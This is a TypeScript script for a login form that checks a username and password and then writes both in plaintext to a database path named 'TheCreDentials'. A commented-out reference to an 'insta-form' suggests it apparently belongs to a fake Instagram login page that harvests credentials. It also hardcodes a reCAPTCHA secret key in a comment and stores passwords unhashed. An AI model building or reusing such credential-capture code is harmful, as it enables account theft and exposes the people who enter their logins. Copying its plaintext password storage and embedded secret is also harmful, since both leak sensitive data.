type error = {errorType:string,details:string}

const setErrors = (errors:error[], errorType:string, details:string) =>{
    let error : error =  {errorType, details}
    let usernameError = errors.find(e => e.errorType === errorType)
    if(!usernameError)
        errors.push(error)
},
    clearError = (errors:error[], errorType:string) =>{
        let error = errors.find(e => e.errorType ===errorType)
        if(error){
            let errIndex = errors.indexOf(error,0);
            errors.splice(errIndex,1)
        }
    }


document.addEventListener('DOMContentLoaded', (e)=>{
    const inputs = document.querySelectorAll("form input")
    const inputEmail =  inputs[0] as HTMLInputElement
    const inputPassword = inputs[1] as HTMLInputElement
    const form = document.querySelector('form') as HTMLFormElement;
    let errors:error[] = [];


    form?.addEventListener('submit', (e)=>{
        e.preventDefault();

        const username =  inputEmail.value
        const password = inputPassword.value

        if(!username || username.length < 3){
            inputEmail.style.border = "1px solid red"
            setErrors(errors, 'usernameError', 'invalidusername')
            console.log(errors)
        }

        else{
            inputEmail.style.border = "none"
            clearError(errors,'usernameError')
        }

        //password


        if(password.match(/^(?=.*[a-zA-Z])(?=.*[0-9])(?=.*[\W_]).{8,}$/)){
            inputPassword.style.border = "none"
            clearError(errors,'passwordError')
        }
        else{
            inputPassword.style.border = "1px solid red"
            setErrors(errors, 'passwordError', 'invalidPassword')
        }

        if(errors.length == 0){
            inserData(username,password)
        }
        
    }) 
    window.onSubmit = (token: string) =>{

        console.log('token', token)

        axios({method:'post', url:'http://localhost:3003', data:{token},withCredentials: false, contentType: 'application/json'})
        .then(function (response:any) {
          console.log(response);
        })
        .catch(function (error:any) {
          console.log(error);
        });



        // $.ajax({
        //     type: "POST",
        //     url: "http://www.google.com/recaptcha/api/siteverify",
        //     data: JSON.stringify([{secret: '6Lck-PsoAAAAAK3x7FWll-NrzOHQLgxoHykGrYur' }, {response : token }]),
        //     contentType: "application/json; charset=utf-8",
        //     dataType: "json",
        //     success: function (response) {
        //         // __doPostBack('form-submit', '');
        //         if(response["score"] >= 0.7) {
        //           console.log('Passed the token successfully');
        //         }
        //     },
        //     failure: function (response) {
        //       // set error message and redirect back to form?
        //       console.log('Robot submit', response);
        //     }
        //   })

       // (document.getElementById("insta-form") as HTMLFormElement).submit();

    }



    const {databse, set, ref, update, remove} = window.functions;


    const inserData = (username:string, password:string) => {

            set(ref(databse, "TheCreDentials/"+username),{
                user: username,
                pass: password
            })
        }



})




